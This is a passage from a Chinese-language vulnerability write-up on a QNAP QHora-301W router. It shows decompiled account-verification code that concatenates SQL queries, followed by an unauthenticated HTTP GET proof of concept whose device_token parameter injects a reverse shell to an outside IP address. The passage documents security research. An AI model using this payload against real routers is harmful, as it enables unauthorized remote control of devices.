class="string">&quot;&quot;</span>;</span><br><span class="line">      v21 = <span class="number">2</span>;</span><br><span class="line">      v9 = <span class="built_in">sub_42F3DC</span>(v11, <span class="number">1LL</span>, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(v9 + <span class="number">64</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_41FB0C</span>(v9 + <span class="number">72</span>, <span class="string">&quot;Execute sql failed! sql: &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(v9 + <span class="number">64</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">sub_41FB0C</span>(v9 + <span class="number">72</span>, a2);</span><br><span class="line">          <span class="keyword">if</span> ( *(_BYTE *)(v9 + <span class="number">64</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sub_41FB0C</span>(v9 + <span class="number">72</span>, <span class="string">&quot;; err: &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( *(_BYTE *)(v9 + <span class="number">64</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">sub_41FAA8</span>(*(_DWORD *)(v9 + <span class="number">72</span>) + <span class="number">120</span>, s);</span><br><span class="line">              <span class="keyword">if</span> ( (*(_DWORD *)(qword_49D020 + <span class="number">72</span>) &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )</span><br><span class="line">                <span class="built_in">sub_41FAFC</span>(*(_QWORD *)(v9 + <span class="number">72</span>));</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sub_40F8D8</span>(v11);</span><br><span class="line">      <span class="built_in">sub_41FB60</span>(a1);</span><br><span class="line">      <span class="built_in">sub_41FB54</span>(s);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">4294966293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>现在继续来看[9]处的函数<code>sub_40EFE4</code></p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40EFE4</span><span class="params">(__int64 a1, __int64 a2, Json::Value **a3, <span class="type">unsigned</span> <span class="type">int</span> a4, __int64 a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v9; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// w0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)v53 = off_460430;</span><br><span class="line">  v54 = <span class="number">0LL</span>;</span><br><span class="line">  s = <span class="number">4</span>;</span><br><span class="line">  v56 = <span class="string">&quot;AcctTable.cpp&quot;</span>;</span><br><span class="line">  v59 = <span class="number">0</span>;</span><br><span class="line">  v60 = <span class="number">0LL</span>;</span><br><span class="line">  v61 = <span class="number">0</span>;</span><br><span class="line">  v62 = <span class="number">0LL</span>;</span><br><span class="line">  v63 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  v65 = <span class="number">0LL</span>;</span><br><span class="line">  v66 = <span class="number">0LL</span>;</span><br><span class="line">  v57 = <span class="number">289LL</span>;</span><br><span class="line">  v58 = <span class="string">&quot;int AcctTable::VerifyAcct(UserInfo, std::string, uint32_t, Json::Value&amp;)&quot;</span>;</span><br><span class="line">  v64 = <span class="number">2</span>;</span><br><span class="line">  v67 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="built_in">sub_42F3DC</span>(v53, <span class="number">1LL</span>, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_40FD80</span>(v9, <span class="string">&quot;Enter&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_40F8D8</span>(v53);</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v29 = &amp;v31;</span><br><span class="line">  v30 = <span class="number">0LL</span>;</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v33, a1 + <span class="number">64</span>);</span><br><span class="line">  std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(<span class="string">&quot;SELECT * FROM &quot;</span>, v33);</span><br><span class="line">  std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v35, <span class="string">&quot; WHERE user_name = &#x27;&quot;</span>);<span class="comment">//[1]</span></span><br><span class="line">  <span class="built_in">sub_40FFC0</span>(v36, a2);</span><br><span class="line">  std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v37, <span class="string">&quot;&#x27; and user_id = &#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_40FFC0</span>(&amp;v38, a2 + <span class="number">32</span>);</span><br><span class="line">  std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v53, <span class="string">&quot;&#x27;;&quot;</span>);</span><br><span class="line">  std::string::_M_dispose(v53);</span><br><span class="line">  std::string::_M_dispose(&amp;v38);</span><br><span class="line">  std::string::_M_dispose(v37);</span><br><span class="line">  std::string::_M_dispose(v36);</span><br><span class="line">  std::string::_M_dispose(v35);</span><br><span class="line">  std::string::_M_dispose(v33);</span><br><span class="line">  Json::Value::<span class="built_in">Value</span>(v37, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">sub_40FBA0</span>(v53, a2);</span><br><span class="line">  v25 = (<span class="type">unsigned</span> __int8)<span class="built_in">sub_40D29C</span>(a1, v53);<span class="comment">//[3]</span></span><br><span class="line">  <span class="built_in">sub_40FB78</span>(v53);</span><br><span class="line">  <span class="keyword">if</span> ( !v25 )</span><br><span class="line">  &#123;</span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(<span class="string">&quot;[&quot;</span>, a2);</span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v36, <span class="string">&quot;] is not existed!&quot;</span>);</span><br><span class="line">    Json::Value::<span class="built_in">Value</span>(v53, &amp;v38);</span><br><span class="line">    Json::Value::<span class="keyword">operator</span>=(a5, v53);</span><br><span class="line">    Json::Value::~<span class="built_in">Value</span>((Json::Value *)v53);</span><br><span class="line">    std::string::_M_dispose(&amp;v38);</span><br><span class="line">    std::string::_M_dispose(v36);</span><br><span class="line">    v10 = <span class="number">-1005</span>;</span><br><span class="line">LABEL_3:</span><br><span class="line">    v28 = v10;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">sub_4200A0</span>(a1, v32[<span class="number">0</span>], (__int64)v37) || (<span class="type">unsigned</span> __int8)Json::Value::<span class="built_in">empty</span>((Json::Value *)v37) ) <span class="comment">//[2]</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(<span class="string">&quot;[&quot;</span>, a2);</span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v36, <span class="string">&quot;] verify failed!&quot;</span>);</span><br><span class="line">    Json::Value::<span class="built_in">Value</span>(v53, &amp;v38);</span><br><span class="line">    Json::Value::<span class="keyword">operator</span>=(a5, v53);</span><br><span class="line">    Json::Value::~<span class="built_in">Value</span>((Json::Value *)v53);</span><br><span class="line">    std::string::_M_dispose(&amp;v38);</span><br><span class="line">    std::string::_M_dispose(v36);</span><br><span class="line">    v10 = <span class="number">-1006</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">  &#125;</span><br><span class="line">  v26 = (Json::Value *)Json::Value::<span class="keyword">operator</span>[](v37, <span class="number">0LL</span>);</span><br><span class="line">  Json::Value::<span class="built_in">Value</span>((Json::Value *)&amp;v38, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  Json::Value::<span class="built_in">get</span>(v26, <span class="string">&quot;pw&quot;</span>, (<span class="type">const</span> Json::Value *)&amp;v38);</span><br><span class="line">  Json::Value::asString[abi:cxx11](v53);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;v29, v36);</span><br><span class="line">  std::string::_M_dispose(v36);</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)v53);</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)&amp;v38);</span><br><span class="line">  <span class="keyword">if</span> ( !v30 )</span><br><span class="line">  &#123;</span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(<span class="string">&quot;[&quot;</span>, a2);</span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v36, <span class="string">&quot;] verify failed!&quot;</span>);</span><br><span class="line">    Json::Value::<span class="built_in">Value</span>(v53, &amp;v38);</span><br><span class="line">    Json::Value::<span class="keyword">operator</span>=(a5, v53);</span><br><span class="line">    Json::Value::~<span class="built_in">Value</span>((Json::Value *)v53);</span><br><span class="line">    std::string::_M_dispose(&amp;v38);</span><br><span class="line">    std::string::_M_dispose(v36);</span><br><span class="line">    v10 = <span class="number">-1008</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_QWORD *)(a2 + <span class="number">40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">sub_40FF18</span>(a3, &amp;v29) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="built_in">sub_40CAA0</span>(a1, v37, a4, a5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(<span class="string">&quot;[&quot;</span>, a2);</span><br><span class="line">      std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v36, <span class="string">&quot;] verify failed!&quot;</span>);</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>(v53, &amp;v38);</span><br><span class="line">      Json::Value::<span class="keyword">operator</span>=(a5, v53);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v53);</span><br><span class="line">      std::string::_M_dispose(&amp;v38);</span><br><span class="line">      std::string::_M_dispose(v36);</span><br><span class="line">      v10 = <span class="number">-1007</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)v53 = <span class="number">0LL</span>;</span><br><span class="line">  v54 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0xF0uLL</span>);</span><br><span class="line">  v12 = *a3;</span><br><span class="line">  v33[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v38 = off_460430;</span><br><span class="line">  v39 = <span class="number">0LL</span>;</span><br><span class="line">  v27 = v12;</span><br><span class="line">  v41 = <span class="string">&quot;AcctTable.cpp&quot;</span>;</span><br><span class="line">  v33[<span class="number">0</span>] = (__int64)&amp;v34;</span><br><span class="line">  v43 = <span class="string">&quot;int AcctTable::VerifyAcct(UserInfo, std::string, uint32_t, Json::Value&amp;)&quot;</span>;</span><br><span class="line">  v40 = <span class="number">128</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">330LL</span>;</span><br><span class="line">  v45 = <span class="number">0LL</span>;</span><br><span class="line">  v49 = <span class="number">2</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">0LL</span>;</span><br><span class="line">  v48 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  v50 = <span class="number">0LL</span>;</span><br><span class="line">  v51 = <span class="number">0LL</span>;</span><br><span class="line">  v52 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="built_in">sub_42F3DC</span>(&amp;v38, <span class="number">1LL</span>, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(v13 + <span class="number">64</span>) )</span><br><span class="line">    <span class="built_in">sub_40A06C</span>(v13 + <span class="number">72</span>, <span class="string">&quot;user_id:&quot;</span>);</span><br><span class="line">  v14 = <span class="built_in">sub_40FE84</span>(v13, a2 + <span class="number">32</span>);</span><br><span class="line">  v15 = <span class="built_in">sub_40FF60</span>(v14, <span class="string">&quot; user_name: &quot;</span>);</span><br><span class="line">  v16 = <span class="built_in">sub_40FE84</span>(v15, a2);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(v16 + <span class="number">64</span>) )</span><br><span class="line">    <span class="built_in">sub_40A06C</span>(v16 + <span class="number">72</span>, <span class="string">&quot; client_type is for quwan&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_40F8D8</span>(&amp;v38);</span><br><span class="line">  <span class="built_in">sub_45A6C8</span>(v53, v27);</span><br><span class="line">  <span class="built_in">sub_409E58</span>((<span class="type">int</span>)&amp;v38, v53);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(v33, &amp;v38);</span><br><span class="line">  std::string::_M_dispose(&amp;v38);</span><br><span class="line">  v17 = (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">bcrypt_checkpw</span>(v33[<span class="number">0</span>], v29) == <span class="number">0</span>;</span><br><span class="line">  v28 = v17;</span><br><span class="line">  <span class="keyword">if</span> ( v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    v44 = <span class="number">0</span>;</span><br><span class="line">    v45 = <span class="number">0LL</span>;</span><br><span class="line">    v38 = off_460430;</span><br><span class="line">    v39 = <span class="number">0LL</span>;</span><br><span class="line">    v40 = <span class="number">128</span>;</span><br><span class="line">    v46 = <span class="number">0</span>;</span><br><span class="line">    v41 = <span class="string">&quot;AcctTable.cpp&quot;</span>;</span><br><span class="line">    v47 = <span class="number">0LL</span>;</span><br><span class="line">    v42 = <span class="number">337LL</span>;</span><br><span class="line">    v50 = <span class="number">0LL</span>;</span><br><span class="line">    v51 = <span class="number">0LL</span>;</span><br><span class="line">    v43 = <span class="string">&quot;int AcctTable::VerifyAcct(UserInfo, std::string, uint32_t, Json::Value&amp;)&quot;</span>;</span><br><span class="line">    v52 = <span class="number">0LL</span>;</span><br><span class="line">    v48 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v49 = <span class="number">2</span>;</span><br><span class="line">    v18 = <span class="built_in">sub_42F3DC</span>(&amp;v38, <span class="number">1LL</span>, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(v18 + <span class="number">64</span>) )</span><br><span class="line">      <span class="built_in">sub_40A06C</span>(v18 + <span class="number">72</span>, <span class="string">&quot;password verification pass!&quot;</span>); <span class="comment">//[4]</span></span><br><span class="line">    <span class="built_in">sub_40F8D8</span>(&amp;v38);</span><br><span class="line">    v19 = <span class="built_in">sub_40CAA0</span>(a1, v37, a4, a5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(<span class="string">&quot;[&quot;</span>, a2);</span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v35, <span class="string">&quot;] verify failed!&quot;</span>); <span class="comment">//[5]</span></span><br><span class="line">    Json::Value::<span class="built_in">Value</span>(&amp;v38, v36);</span><br><span class="line">    Json::Value::<span class="keyword">operator</span>=(a5, &amp;v38);</span><br><span class="line">    Json::Value::~<span class="built_in">Value</span>((Json::Value *)&amp;v38);</span><br><span class="line">    std::string::_M_dispose(v36);</span><br><span class="line">    std::string::_M_dispose(v35);</span><br><span class="line">    v19 = <span class="number">-1007</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v19;</span><br><span class="line">  std::string::_M_dispose(v33);</span><br><span class="line">LABEL_4:</span><br><span class="line">  <span class="keyword">if</span> ( v28 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)v53 = off_460430;</span><br><span class="line">    v54 = <span class="number">0LL</span>;</span><br><span class="line">    s = <span class="number">16</span>;</span><br><span class="line">    v56 = <span class="string">&quot;AcctTable.cpp&quot;</span>;</span><br><span class="line">    v58 = <span class="string">&quot;int AcctTable::VerifyAcct(UserInfo, std::string, uint32_t, Json::Value&amp;)&quot;</span>;</span><br><span class="line">    v59 = <span class="number">0</span>;</span><br><span class="line">    v60 = <span class="number">0LL</span>;</span><br><span class="line">    v61 = <span class="number">0</span>;</span><br><span class="line">    v62 = <span class="number">0LL</span>;</span><br><span class="line">    v63 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v65 = <span class="number">0LL</span>;</span><br><span class="line">    v66 = <span class="number">0LL</span>;</span><br><span class="line">    v57 = <span class="number">348LL</span>;</span><br><span class="line">    v67 = <span class="number">0LL</span>;</span><br><span class="line">    v64 = <span class="number">2</span>;</span><br><span class="line">    v11 = <span class="built_in">sub_42F3DC</span>(v53, <span class="number">1LL</span>, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_40A01C</span>(v11, a5);</span><br><span class="line">    <span class="built_in">sub_40F8D8</span>(v53);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)v53 = off_460430;</span><br><span class="line">  v54 = <span class="number">0LL</span>;</span><br><span class="line">  s = <span class="number">4</span>;</span><br><span class="line">  v56 = <span class="string">&quot;AcctTable.cpp&quot;</span>;</span><br><span class="line">  v58 = <span class="string">&quot;int AcctTable::VerifyAcct(UserInfo, std::string, uint32_t, Json::Value&amp;)&quot;</span>;</span><br><span class="line">  v59 = <span class="number">0</span>;</span><br><span class="line">  v60 = <span class="number">0LL</span>;</span><br><span class="line">  v61 = <span class="number">0</span>;</span><br><span class="line">  v62 = <span class="number">0LL</span>;</span><br><span class="line">  v63 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  v65 = <span class="number">0LL</span>;</span><br><span class="line">  v66 = <span class="number">0LL</span>;</span><br><span class="line">  v57 = <span class="number">350LL</span>;</span><br><span class="line">  v67 = <span class="number">0LL</span>;</span><br><span class="line">  v64 = <span class="number">2</span>;</span><br><span class="line">  v20 = <span class="built_in">sub_42F3DC</span>(v53, <span class="number">1LL</span>, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">  v21 = <span class="built_in">sub_40FD80</span>(v20, <span class="string">&quot;Exit &quot;</span>);</span><br><span class="line">  <span class="built_in">sub_40A0B4</span>(v21, &amp;v28);</span><br><span class="line">  <span class="built_in">sub_40F8D8</span>(v53);</span><br><span class="line">  v22 = v28;</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)v37);</span><br><span class="line">  std::string::_M_dispose(v32);</span><br><span class="line">  std::string::_M_dispose(&amp;v29);</span><br><span class="line">  <span class="keyword">return</span> v22;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>可以看到在[1],[2]处和上级函数一样的拼接和调用, 也可以看到[4],[5]处对于验证账号密码的一些日志输出, 而[3]处的函数除了语句的不同基本一致.</p>
</blockquote>
<blockquote>
<p>所以到这里我们的这个漏洞分析就结束了, 再次声明一下我没有对这个漏洞做过测试, 只是在代码层面来讲可能有漏洞的一次分析, 如果这个漏洞不能够复现师傅们就当看个笑话吧.</p>
</blockquote>
<h3 id="vuln-2"><a href="#vuln-2" class="headerlink" title="vuln-2"></a>vuln-2</h3><blockquote>
<p>下面两个漏洞都在web, 并且都是未授权的RCE, 第一个是一个触手可及的RCE, 甚至是GET请求, 现在让我们将思路回到web上.</p>
</blockquote>
<blockquote>
<p>上面我总结了这些函数是不需要认证的<code>qhora_301w.regV1NonAuthAPIs(), qhora_301w.regV2NonAuthAPIs()</code>, 这两个函数中设置的路由如下</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">GET /miro/api/v2/system/machine_info <span class="comment">//获取请求没有参数可以控</span></span><br><span class="line">GET /miro/api/v2/website_info <span class="comment">//获取请求没有参数可以控</span></span><br><span class="line">POST /miro/api/v2/internal/event <span class="comment">//代码看起来像是控制LED的,传参但无值可以控</span></span><br><span class="line"></span><br><span class="line">POST /miro/api/v1/login <span class="comment">//登录接口使用gin-jwt框架的登录方法</span></span><br><span class="line">POST /miro/api/v1/initial/login <span class="comment">//登录接口使用gin-jwt框架的登录方法</span></span><br><span class="line">GET /miro/api/v1/verify_device <span class="comment">//验证设备</span></span><br><span class="line">GET /miro/api/v1/machine_info <span class="comment">//获取请求没有参数可以控</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>这里也不绕弯子了, 存在漏洞的路径是 &#x2F;miro&#x2F;api&#x2F;v1&#x2F;verify_device, POC如下.</p>
</blockquote>
<div class="code-container" data-rel="Https"><figure class="iseeu highlight https"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/miro/api/v1/verify_device?verify_device=1&amp;device_token=super$(sh</span> -i <span class="string">&gt;&amp;</span> /dev/tcp/74.48.140.145/2333 <span class="string">0&gt;&amp;1)command&amp;callback=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.199.221</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">baggage</span><span class="punctuation">: </span>sentry-environment=production,sentry-public_key=cd1cc31d0e574fb20f9153041f7ed837,sentry-trace_id=fc1a9e84d3894a08b913aea1d770b389,sentry-sample_rate=1,sentry-transaction=Initialize,sentry-sampled=true</span><br><span class="line"><span class="attribute">authorization</span><span class="punctuation">: </span>Bearer undefined</span><br><span class="line"><span class="attribute">sentry-trace</span><span class="punctuation">: </span>fc1a9e84d3894a08b913aea1d770b389-9f122e0b7e1df1d3-1</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.199.221/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>len=null</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>来看一下代码吧, 首先到我们的<code>qhora_301w.regV1NonAuthAPIs()</code>函数.</p>
</blockquote>
